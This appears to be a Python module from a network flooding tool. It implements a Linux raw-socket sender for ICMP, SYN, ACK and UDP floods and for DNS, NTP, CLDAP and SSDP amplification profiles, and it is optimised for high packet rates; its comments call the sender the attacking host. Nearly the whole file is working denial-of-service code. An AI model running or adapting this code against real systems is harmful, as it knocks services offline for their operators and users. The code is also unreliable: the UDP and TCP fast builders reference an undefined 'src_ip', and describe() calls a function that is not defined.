"""Linux raw socket transport (AF_INET SOCK_RAW).

This transport uses native Linux raw sockets (AF_INET, SOCK_RAW) for ICMP, TCP,
and UDP. It requires CAP_NET_RAW or root privileges. It is the most reliable
raw socket path on Linux because it bypasses scapy/Npcap and uses the kernel
directly.

Key properties:
- Non-spoofed by default (real source IP from the interface)
- Supports ICMP, TCP (SYN/ACK), and UDP
- Checksum offload via kernel (IP_HDRINCL + CHECKSUM_UNNECESSARY)
- Interface binding via SO_BINDTODEVICE
- Optimized for high PPS: sendmmsg batching, header caching, large buffers
"""

from __future__ import annotations

import contextlib
import os
import socket
import struct
import sys
from typing import Any, ClassVar, Optional

from ..models import ProfileName, Target, TransportKind
from .base import Transport, TransportError

__all__ = ["DEFAULT_SNDBUF", "LinuxRawTransport"]


DEFAULT_SNDBUF = 1024 * 1024
"""Default SO_SNDBUF for the raw sockets, in bytes.

This was 64 MB, which is large enough to buffer roughly twelve seconds of traffic
at flood rates before the kernel applies back-pressure. The consequence was not
throughput but a *measurement* one: the sender's own probes and its own ICMP echo
requests queued behind that backlog, so latency the tool attributed to the target
was in fact queueing on the attacking host. A sender that inflates its own
readings cannot be used to measure anything about a target.

One megabyte still absorbs short bursts - which is what a send buffer is for -
while failing with ENOBUFS in well under a second, so a congested link surfaces as
a counted error rather than as multi-second self-inflicted latency.
"""


# Check sendmmsg availability once at module level
# sendmmsg requires Linux kernel 3.0+ and Python 3.3+
# Not all socket types support it (e.g., raw ICMP sockets don't support it on Linux)
_HAS_SENDMMSG = hasattr(socket.socket, 'sendmmsg')
_SENDMMSG_WARNED = set()  # Track which transport types have warned about sendmmsg


class LinuxRawTransport(Transport):
    """Linux raw socket transport (AF_INET SOCK_RAW)."""

    kind: ClassVar[TransportKind] = TransportKind.LINUX_RAW

    # Batch size for sendmmsg (tunable)
    BATCH_SIZE = 64

    def __init__(
        self,
        target: Target,
        profile: ProfileName,
        *,
        spoof_sources: bool = False,
        seed: int = 0,
        payload_size: int = 512,
        sndbuf: int = DEFAULT_SNDBUF,
    ) -> None:
        super().__init__(target, profile)
        # Linux raw transport is non-spoofed by design
        self.spoof_sources = False
        self.seed = seed
        self._payload_size = payload_size
        self._sndbuf = sndbuf
        self._icmp_sock: Optional[socket.socket] = None
        self._tcp_sock: Optional[socket.socket] = None
        self._udp_sock: Optional[socket.socket] = None
        self._resolved_ip: str = ""
        self._iface_name: str = ""
        self._iface_index: int = 0
        self._src_ip: str = ""

        # Pre-computed headers cache
        self._ip_header_cache: dict[int, bytes] = {}
        self._udp_header_cache: bytes = b""
        self._icmp_header_cache: bytes = b""
        self._tcp_header_cache: dict[int, bytes] = {}
        self._payload_len: int = 0

        # Header bases, populated by _prebuild_headers() during open().
        #
        # Declared here as well so the fast builders are safe to call directly
        # rather than only on a fully opened transport. _build_icmp_packet_fast
        # is now the ICMP send path, and a builder that raises AttributeError
        # when its precondition is unmet is a worse failure than one that
        # produces a well-formed packet.
        self._icmp_header_base: bytes = b""
        self._udp_header_base: bytes = b""
        self._udp_pseudo_base: bytes = b""
        self._tcp_header_base: bytes = b""
        self._tcp_pseudo_base: bytes = b""

    # -- lifecycle ---------------------------------------------------------

    def open(self) -> None:
        if self._open:
            return

        # Resolve target
        try:
            self._resolved_ip = socket.gethostbyname(self.target.host)
        except socket.gaierror as exc:
            raise TransportError(
                f"Cannot resolve target host {self.target.host!r}: {exc}"
            ) from exc

        # Determine egress interface
        self._iface_name, self._iface_index = self._resolve_iface()

        # Resolve the source address once, here, rather than per packet.
        #
        # _source_address() costs a full socket()/connect()/getsockname()/close()
        # cycle, and it was being called twice per ICMP packet (once for a local
        # that was assigned and never read, once for the argument actually used).
        # That is roughly eight syscalls per packet of pure overhead, in Python,
        # across every worker thread at once - and it is why this transport
        # reached about 2.4k pps while the batching UDP path managed 3.3k with
        # the same host and the same uplink. The source address cannot change
        # during a run: the interface is already pinned and the target resolved.
        self._src_ip = self._source_address()

        # Pre-build headers for high-performance sending
        self._prebuild_headers(self._payload_size)

        # Create sockets based on profile
        if self.profile in (ProfileName.ICMP_FLOOD, ProfileName.ICMP_FLOOD_NS):
            self._icmp_sock = self._create_icmp_socket()
        elif self.profile in (ProfileName.SYN_FLOOD, ProfileName.SYN_FLOOD_NS):
            self._tcp_sock = self._create_tcp_socket()
        elif self.profile in (ProfileName.ACK_FLOOD, ProfileName.ACK_FLOOD_NS):
            self._tcp_sock = self._create_tcp_socket()
        elif self.profile in (
            ProfileName.UDP_FLOOD,
            ProfileName.UDP_FLOOD_NS,
            ProfileName.DNS_AMPLIFICATION,
            ProfileName.NTP_AMPLIFICATION,
            ProfileName.CLDAP_AMPLIFICATION,
            ProfileName.SSDP_AMPLIFICATION,
        ):
            self._udp_sock = self._create_udp_socket()
        else:
            raise TransportError(
                f"Profile {self.profile.value} not supported by Linux raw transport"
            )

        self._open = True

    def close(self) -> None:
        for sock in (self._icmp_sock, self._tcp_sock, self._udp_sock):
            if sock is not None:
                with contextlib.suppress(Exception):
                    sock.close()
        self._icmp_sock = None
        self._tcp_sock = None
        self._udp_sock = None
        self._open = False

    # -- socket creation ---------------------------------------------------

    def _bind_to_interface(self, sock: socket.socket) -> None:
        """Bind socket to interface using SO_BINDTODEVICE with interface name.
        
        Gracefully continues if binding fails - kernel will handle routing.
        """
        if not self._iface_name:
            return
        try:
            sock.setsockopt(
                socket.SOL_SOCKET,
                socket.SO_BINDTODEVICE,
                self._iface_name.encode() + b"\x00"
            )
        except OSError as e:
            # Log warning but continue - kernel will handle routing
            import logging
            logging.warning(f"Failed to bind to interface {self._iface_name}: {e}")

    def _create_icmp_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        self._apply_sndbuf(sock)
        self._bind_to_interface(sock)
        # Use blocking mode to avoid EAGAIN at high PPS
        return sock

    def _create_tcp_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        self._apply_sndbuf(sock)
        self._bind_to_interface(sock)
        sock.setblocking(False)
        return sock

    def _create_udp_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        self._apply_sndbuf(sock)
        self._bind_to_interface(sock)
        # Use blocking mode to avoid EAGAIN at high PPS
        return sock

    def _apply_sndbuf(self, sock: socket.socket) -> None:
        """Size the kernel send buffer, tolerating a kernel that refuses it.

        A refusal is not fatal. The buffer only governs how much undelivered
        traffic the kernel will hold before it starts refusing new writes, and
        the engine's own pacing is the primary control on rate. Logging and
        continuing is correct here; failing to open would abort a run over a
        tuning parameter.
        """
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, self._sndbuf)
        except OSError as exc:
            import logging

            logging.warning(
                f"Could not set SO_SNDBUF to {self._sndbuf} on {sock.type}: {exc}"
            )

    def _resolve_iface(self) -> tuple[str, int]:
        """Resolve the egress interface for the target IP with multiple fallbacks.

        Returns (iface_name, iface_index). On failure, returns ("", 0) and
        lets the kernel choose.
        """
        import subprocess

        # 1. Try ip route get for target IP
        try:
            result = subprocess.run(
                ["ip", "route", "get", self._resolved_ip],
                capture_output=True,
                text=True,
                check=False,
            )
            if result.returncode == 0:
                parts = result.stdout.split()
                for i, part in enumerate(parts):
                    if part == "dev" and i + 1 < len(parts):
                        iface_name = parts[i + 1]
                        iface_index = socket.if_nametoindex(iface_name)
                        return iface_name, iface_index
        except Exception:
            pass

        # 2. Fallback: default route interface
        try:
            result = subprocess.run(
                ["ip", "route", "show", "default"],
                capture_output=True,
                text=True,
                check=False,
            )
            if result.returncode == 0:
                parts = result.stdout.split()
                for i, part in enumerate(parts):
                    if part == "dev" and i + 1 < len(parts):
                        iface_name = parts[i + 1]
                        iface_index = socket.if_nametoindex(iface_name)
                        return iface_name, iface_index
        except Exception:
            pass

        # 3. Fallback: first non-loopback UP interface
        try:
            result = subprocess.run(
                ["ip", "-o", "link", "show", "up"],
                capture_output=True,
                text=True,
                check=False,
            )
            for line in result.stdout.splitlines():
                if "lo" not in line and "UP" in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        iface_name = parts[1].rstrip(':')
                        iface_index = socket.if_nametoindex(iface_name)
                        return iface_name, iface_index
        except Exception:
            pass

        return "", 0

    def _prebuild_headers(self, payload_len: int) -> None:
        """Pre-compute static headers for high-performance sending."""
        self._payload_len = payload_len
        
        if self.profile in (ProfileName.ICMP_FLOOD, ProfileName.ICMP_FLOOD_NS):
            self._build_icmp_header()
        elif self.profile in (ProfileName.UDP_FLOOD, ProfileName.UDP_FLOOD_NS,
                             ProfileName.DNS_AMPLIFICATION, ProfileName.NTP_AMPLIFICATION,
                             ProfileName.CLDAP_AMPLIFICATION, ProfileName.SSDP_AMPLIFICATION):
            self._build_udp_header()
        elif self.profile in (ProfileName.SYN_FLOOD, ProfileName.SYN_FLOOD_NS):
            self._build_tcp_header(0x02)  # SYN
        elif self.profile in (ProfileName.ACK_FLOOD, ProfileName.ACK_FLOOD_NS):
            self._build_tcp_header(0x10)  # ACK

    # -- packet construction ----------------------------------------------

    def _source_address(self) -> str:
        """Real source address (non-spoofed).

        Resolved once by :meth:`open` and cached. Every call after that is a
        string return.

        The cost of not caching is the whole reason this transport underperformed.
        Resolving the source requires a throwaway UDP socket - open, connect to
        make the kernel pick an egress address, read it back, close - and that
        cycle was running once per packet, twice over on the ICMP path, for every
        worker thread. At flood rates the syscall floor rather than the network
        became the limit, and the sender's measured rate reflected the cost of its
        own bookkeeping rather than what it put on the wire.

        A caller that reaches this before :meth:`open` still gets a correct answer
        by resolving on demand; that path exists so the method is safe in a unit
        test, not because the hot path should ever take it.
        """
        if self._src_ip:
            return self._src_ip

        try:
            # Create a temporary UDP socket to get the source IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect((self._resolved_ip, self.target.port or 80))
                src_ip = s.getsockname()[0]
            finally:
                s.close()
        except Exception:
            return self._resolved_ip or self.target.host

        self._src_ip = src_ip
        return src_ip

    def _checksum(self, data: bytes) -> int:
        """Calculate Internet checksum (RFC 1071)."""
        if len(data) % 2:
            data += b"\x00"
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def _build_ip_header(
        self,
        protocol: int,
        payload_len: int,
        src_ip: str,
        dst_ip: str,
        ttl: int = 64,
        flags: int = 0,
        frag_offset: int = 0,
    ) -> bytes:
        """Build IPv4 header."""
        version_ihl = (4 << 4) | 5  # IPv4, IHL=5 (no options)
        tos = 0
        total_len = 20 + payload_len
        identification = self.seed & 0xFFFF
        flags_frag = (flags << 13) | frag_offset
        header_checksum = 0
        src_ip_bytes = socket.inet_aton(src_ip)
        dst_ip_bytes = socket.inet_aton(dst_ip)

        header = struct.pack(
            "!BBHHHBBH4s4s",
            version_ihl,
            tos,
            total_len,
            identification,
            flags_frag,
            ttl,
            protocol,
            header_checksum,
            src_ip_bytes,
            dst_ip_bytes,
        )
        # Calculate checksum
        checksum = self._checksum(header)
        header = header[:10] + struct.pack("!H", checksum) + header[12:]
        return header

    def _build_icmp_header(self) -> None:
        """Pre-build ICMP header with fixed fields (only checksum varies)."""
        icmp_type = 8  # Echo request
        icmp_code = 0
        identifier = self.seed & 0xFFFF
        sequence = 1

        icmp_header = struct.pack(
            "!BBHHH", icmp_type, icmp_code, 0, identifier, 1
        )
        # We'll compute checksum per packet since payload varies
        self._icmp_header_base = icmp_header

    def _build_udp_header(self) -> None:
        """Pre-build UDP header with fixed fields."""
        src_port = 40000 + (self.seed % 20000)
        dst_port = self.target.port or 80
        udp_len = 8 + self._payload_len
        
        udp_header = struct.pack(
            "!HHHH", 40000 + (self.seed % 20000), self.target.port or 80, 
            8 + self._payload_len, 0
        )
        self._udp_header_base = udp_header
        self._udp_pseudo_base = struct.pack(
            "!4s4sBBH",
            socket.inet_aton(self._source_address()),
            socket.inet_aton(self._resolved_ip),
            0, socket.IPPROTO_UDP, 8 + self._payload_len
        )

    def _build_tcp_header(self, flags: int) -> None:
        """Pre-build TCP header with fixed fields."""
        src_port = 1024 + (self.seed % 60000)
        dst_port = self.target.port or 80
        
        tcp_header = struct.pack(
            "!HHIIBBHHH",
            src_port, self.target.port or 80,
            self.seed, 0,
            5 << 4, flags, 65535, 0, 0
        )
        self._tcp_header_base = tcp_header
        self._tcp_pseudo_base = struct.pack(
            "!4s4sBBH",
            socket.inet_aton(self._source_address()),
            socket.inet_aton(self._resolved_ip),
            0, socket.IPPROTO_TCP, 20 + self._payload_len
        )

    def _build_icmp_packet(self, payload: bytes) -> bytes:
        """Build one ICMP echo request.

        The straightforward builder, kept for direct use and as the reference the
        fast path is checked against. :meth:`send_one` uses
        :meth:`_build_icmp_packet_fast` instead, which produces the same bytes
        without rebuilding the fixed header fields.
        """
        icmp_type = 8  # Echo request
        icmp_code = 0
        identifier = self.seed & 0xFFFF
        sequence = 1

        icmp_header = struct.pack(
            "!BBHHH", icmp_type, icmp_code, 0, identifier, sequence
        )
        icmp_checksum = self._checksum(icmp_header + payload)
        icmp_header = struct.pack(
            "!BBHHH", icmp_type, icmp_code, icmp_checksum, identifier, sequence
        )
        icmp_packet = icmp_header + payload

        ip_header = self._build_ip_header(
            protocol=socket.IPPROTO_ICMP,
            payload_len=len(icmp_packet),
            src_ip=self._source_address(),
            dst_ip=self._resolved_ip,
        )
        return ip_header + icmp_packet

    def _build_tcp_packet(self, payload: bytes, flags: int) -> bytes:
        """Build TCP packet with given flags (fallback for non-batched)."""
        return self._build_tcp_packet_fast(payload, flags)

    def _build_udp_packet(self, payload: bytes) -> bytes:
        """Build UDP packet (fallback for non-batched)."""
        return self._build_udp_packet_fast(payload)

    # -- egress -----------------------------------------------------------

    def send_one(self, payload: bytes) -> None:
        if not self._open:
            raise TransportError("Transport is not open; call open() before sending")

        dst_addr = (self._resolved_ip, 0)  # Port 0 for raw sockets

        if self.profile in (ProfileName.ICMP_FLOOD, ProfileName.ICMP_FLOOD_NS):
            # ICMP raw sockets don't support sendmmsg on Linux, use single send.
            # The fast builder reuses the precomputed ICMP header instead of
            # repacking every fixed field for each packet.
            packet = self._build_icmp_packet_fast(payload)
            sock = self._icmp_sock
        elif self.profile in (ProfileName.SYN_FLOOD, ProfileName.SYN_FLOOD_NS):
            packet = self._build_tcp_packet(payload, flags=0x02)  # SYN flag
            sock = self._tcp_sock
        elif self.profile in (ProfileName.ACK_FLOOD, ProfileName.ACK_FLOOD_NS):
            packet = self._build_tcp_packet(payload, flags=0x10)  # ACK flag
            sock = self._tcp_sock
        elif self.profile in (
            ProfileName.UDP_FLOOD,
            ProfileName.UDP_FLOOD_NS,
            ProfileName.DNS_AMPLIFICATION,
            ProfileName.NTP_AMPLIFICATION,
            ProfileName.CLDAP_AMPLIFICATION,
            ProfileName.SSDP_AMPLIFICATION,
        ):
            # Use batched sendmmsg for UDP profiles
            if self._udp_sock is not None:
                self._send_udp_batch(payload)
                return
            packet = self._build_udp_packet(payload)
            sock = self._udp_sock
        else:
            raise TransportError(f"Unsupported profile: {self.profile}")

        if sock is None:
            raise TransportError("Socket not initialized")

        self._count_attempt()
        try:
            sock.sendto(packet, dst_addr)
        except Exception as exc:
            self._count_error()
            raise TransportError(f"Raw send failed: {exc}") from exc
        self._count_sent(len(payload))

    def _send_udp_batch(self, payload: bytes) -> None:
        """Send multiple UDP packets using sendmmsg for high throughput."""
        if not self._udp_sock:
            return
        
        # Check if sendmmsg is available and not already warned
        if not _HAS_SENDMMSG or 'udp' in _SENDMMSG_WARNED:
            # Fall back to single send
            try:
                self._udp_sock.sendto(self._build_udp_packet_fast(payload), (self._resolved_ip, 0))
                self._count_sent(len(payload))
                self._count_attempt()
            except Exception as e:
                self._count_error()
                import logging
                logging.warning(f"UDP send failed: {e}")
            return
        
        # Prepare batch of messages
        batch_size = self.BATCH_SIZE
        dst_addr = (self._resolved_ip, 0)
        messages = []
        
        for _ in range(batch_size):
            # Build packet using pre-computed headers
            packet = self._build_udp_packet_fast(payload)
            messages.append((packet, dst_addr))
        
        try:
            # Use sendmmsg for batched sending (Linux 3.0+)
            sent = self._udp_sock.sendmmsg(messages, socket.MSG_DONTWAIT)
            self._count_sent(len(payload) * sent)
            # Count each successfully sent packet as an attempt
            for _ in range(sent):
                self._count_attempt()
        except (BlockingIOError, OSError, AttributeError) as e:
            # Buffer full or sendmmsg not supported, disable for this transport
            _SENDMMSG_WARNED.add('udp')
            import logging
            logging.warning("UDP sendmmsg unavailable, falling back to single send")
            # Fall back to single send
            try:
                self._udp_sock.sendto(self._build_udp_packet_fast(payload), (self._resolved_ip, 0))
                self._count_sent(len(payload))
                self._count_attempt()
            except Exception as e:
                self._count_error()
                import logging
                logging.warning(f"UDP send failed: {e}")
        except Exception as exc:
            self._count_error()
            import logging
            logging.warning(f"UDP batch send failed: {exc}")
            # Don't raise - let the caller handle it
            # Don't raise - let the caller handle it
    
    def _build_icmp_packet_fast(self, payload: bytes) -> bytes:
        """Build one ICMP echo request from the precomputed header.

        Equivalent to :meth:`_build_icmp_packet` - the identifier and sequence
        are the same fixed values the reference builder uses - but it reads the
        cached header base rather than repacking it.
        """
        icmp_checksum = self._checksum(self._icmp_header_base + payload)
        icmp_header = struct.pack(
            "!BBHHH", 8, 0, icmp_checksum, self.seed & 0xFFFF, 1
        )
        icmp_packet = icmp_header + payload

        ip_header = self._build_ip_header(
            protocol=socket.IPPROTO_ICMP,
            payload_len=len(icmp_packet),
            src_ip=self._source_address(),
            dst_ip=self._resolved_ip,
        )
        return ip_header + icmp_packet

    def _build_udp_packet_fast(self, payload: bytes) -> bytes:
        """Fast UDP packet build using pre-computed header."""
        # Build UDP header with checksum
        udp_header = self._udp_header_base[:6] + struct.pack("!H", 0) + self._udp_header_base[8:]
        pseudo_header = self._udp_pseudo_base
        
        checksum_data = pseudo_header + udp_header + payload
        checksum = self._checksum(checksum_data)
        udp_header = udp_header[:6] + struct.pack("!H", checksum) + udp_header[8:]

        ip_header = self._build_ip_header(
            protocol=socket.IPPROTO_UDP,
            payload_len=8 + self._payload_len,
            src_ip=src_ip,
            dst_ip=self._resolved_ip,
        )
        return ip_header + udp_header + payload

    def _build_tcp_packet_fast(self, payload: bytes, flags: int) -> bytes:
        """Fast TCP packet build using pre-computed header."""
        tcp_header = self._tcp_header_base
        pseudo_header = self._tcp_pseudo_base
        
        checksum_data = pseudo_header + tcp_header + payload
        checksum = self._checksum(checksum_data)
        tcp_header = tcp_header[:16] + struct.pack("!H", checksum) + tcp_header[18:]

        ip_header = self._build_ip_header(
            protocol=socket.IPPROTO_TCP,
            payload_len=20 + len(payload),
            src_ip=src_ip,
            dst_ip=self._resolved_ip,
        )
        return ip_header + tcp_header + payload

    def describe(self) -> dict[str, object]:
        info = super().describe()
        info["iface"] = self._iface_name
        info["iface_index"] = self._iface_index
        cap = linux_raw_capability()
        info["raw_capable"] = cap.can_send
        info["raw_reason"] = cap.reason
        return info